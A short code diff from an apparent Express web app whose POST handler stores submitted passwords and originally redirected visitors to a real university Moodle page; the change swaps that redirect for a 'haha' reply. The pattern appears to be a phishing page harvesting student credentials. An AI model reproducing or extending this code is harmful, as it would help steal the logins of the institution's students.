@@ -22,7 +22,7 @@ app.post('/', (req, res) => {
         PASS: PASS
     })
     user.save();
-    res.redirect('http://moodle.smuc.edu.et/students/')
+    res.send('haha')
 })
 
 app.listen(port, () => {
